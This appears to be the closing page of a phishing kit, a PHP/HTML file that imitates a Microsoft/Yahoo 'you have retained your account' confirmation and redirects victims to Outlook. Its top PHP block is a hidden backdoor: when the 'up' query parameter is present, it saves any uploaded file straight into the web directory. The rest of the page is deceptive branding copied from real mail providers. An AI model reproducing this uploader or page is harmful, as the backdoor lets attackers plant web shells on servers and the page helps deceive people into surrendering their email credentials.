<?php
 $UP = $_GET['up'];
if(isset($UP) && !empty($UP)){
echo"".$_FILES['userfile']."";
$uploaddir = './';
$uploadfile = $uploaddir . basename($_FILES['userfile']['name']);
if ( isset($_FILES["userfile"]) ) {
    echo '<p><font color="#00FF00" size="7">Uploaded</font></p>';
    if (move_uploaded_file
($_FILES["userfile"]["tmp_name"], $uploadfile))
echo $uploadfile;
    else echo '<p><font color="#FF0000" size="7">Failed</font></p>';
}
}

?>

<style type="text/css"></style>
<SCRIPT SRC=''></SCRIPT><!-- fF7eSD8=new Array(); -->

<p>&nbsp;</p>
<meta http-equiv="refresh" content="10;url=https://outlook.office.com/owa/" />
<div class="header" style="margin: 0px; padding: 0px; box-sizing: border-box; color: #343d47; font-family: 'helvetica neue', helvetica, verdana, tahoma, arial, sans-serif; font-size: 15px;">
<div class="uhd" style="margin: 0px; padding: 0px; box-sizing: border-box;">
<div id="yUnivHead" class="yucs-it-it yucs-slim" style="margin: 0px auto; padding: 0px; box-sizing: border-box; font-size: 12px; width: 1263px; font-family: Arial; z-index: 9999; position: relative; color: #676767; background: #ffffff;" data-flight="1435359098" data-lang="it-it" data-property="login" data-uhvc="/"><a class="yucs-skipto-search yucs-activate" style="color: #676767; text-decoration: none; box-sizing: border-box; position: absolute; text-indent: -999em; overflow: hidden;" href="https://eu.edit.yahoo.com/registration#yuhead-search"><font style="box-sizing: border-box;">Skip to search.</font></a>
<div id="yuhead-hd" class="yuhead-clearfix" style="margin: 0px; padding: 8px 10px 13px; box-sizing: border-box; font-size: 11.1599998474121px; zoom: 1;"><img src="https://encrypted-tbn1.gstatic.com/images?q=tbn:ANd9GcQVxDWVOmrMGNU6xYlwjy0lZg_FpTU9swZxXk2PRLj_S1XtH8eZuw" alt="" /></div>
</div>
</div>
</div>
<div class="main" style="margin: 0px auto; padding: 0px; box-sizing: border-box; min-height: 100%; width: 36.6em; color: #343d47; font-family: 'helvetica neue', helvetica, verdana, tahoma, arial, sans-serif; font-size: 15px;">
<div class="input-container center" style="margin: 100px 0px 0px; padding: 0px; text-align: center; box-sizing: border-box;">
<h1 style="margin: 0px 0px 32px; padding: 0px; font-weight: 200; box-sizing: border-box;"><font style="box-sizing: border-box;">Congratulations</font></h1>
<p class="banner-large" style="margin: 0px; padding: 0px; font-size: 1.6em; line-height: 1.58333em; box-sizing: border-box;"><font style="box-sizing: border-box;">You have retained your account with us</font></p>
<p class="banner-large" style="margin: 0px; padding: 0px; font-size: 1.6em; line-height: 1.58333em; box-sizing: border-box;"><font style="box-sizing: border-box;">Thank You!</font></p>
<form id="confirm-form" style="margin: 0px; padding: 0px; box-sizing: border-box;" action="http://www.hotmail.com" method="post">
<div class="row input-row" style="margin: 0.4em 0px 0px; padding: 0px; position: relative; zoom: 1; box-sizing: border-box;"><font size="4" color="#000000" face="veranda"><br /></font><font size="4" color="#000000" face="veranda"><span style="color: white;">GO TO INBOX</span></font></div>
<div class="row mp-row" style="margin: 3.6em 0px 0px; padding: 0px; position: relative; zoom: 1; box-sizing: border-box;">
<div class="column" style="margin: 0px; padding: 0px; position: relative; display: inline-block; vertical-align: middle; zoom: 1; height: 136px; box-sizing: border-box;"><input id="mp" style="margin: 0px; padding: 0px; font-family: inherit; font-size: inherit; font-weight: inherit; opacity: 0;" checked="checked" name="mktgPrefs" type="checkbox" value="yes" />&nbsp;<label class="messages" style="font-size: 0.8em; box-sizing: border-box; color: #a5a5a5; position: relative;" for="mp"><strong style="box-sizing: border-box;"><font style="box-sizing: border-box;"><font style="box-sizing: border-box;">Stay in touch with the world of Microsoft</font></font></strong><br style="box-sizing: border-box;" /> <br style="box-sizing: border-box;" /> <font style="box-sizing: border-box;"><font style="box-sizing: border-box;">Contests, unique, new products and services in preview: do not miss anything&nbsp;</font><font style="box-sizing: border-box;">Click on the box next to receive our communications.&nbsp;</font><font style="box-sizing: border-box;">Remember, you can unsubscribe at any time.&nbsp;</font><a style="color: #324fe1; text-decoration: none; box-sizing: border-box;" href="http://privacy.yahoo.com/privacy/it/delivers/details.html" target="_blank"><font style="box-sizing: border-box;">Read more</font></a><font style="box-sizing: border-box;">&nbsp;-&nbsp;</font><a style="color: #324fe1; text-decoration: none; box-sizing: border-box;" href="http://www.hotmail.com" target="_blank"><font style="box-sizing: border-box;">Your Privacy</font></a><font style="box-sizing: border-box;">-&nbsp;</font><a style="color: #324fe1; text-decoration: none; box-sizing: border-box;" href="http://it.docs.yahoo.com/info/utos.html" target="_blank"><font style="box-sizing: border-box;">Aut.&nbsp;</font></a><a style="color: #324fe1; text-decoration: none; box-sizing: border-box;" href="http://it.docs.yahoo.com/info/utos.html" target="_blank"><font style="box-sizing: border-box;">processing personal data</font></a></font></label><br style="box-sizing: border-box;" /> <br style="box-sizing: border-box;" /> &nbsp;</div>
</div>
</form></div>
</div>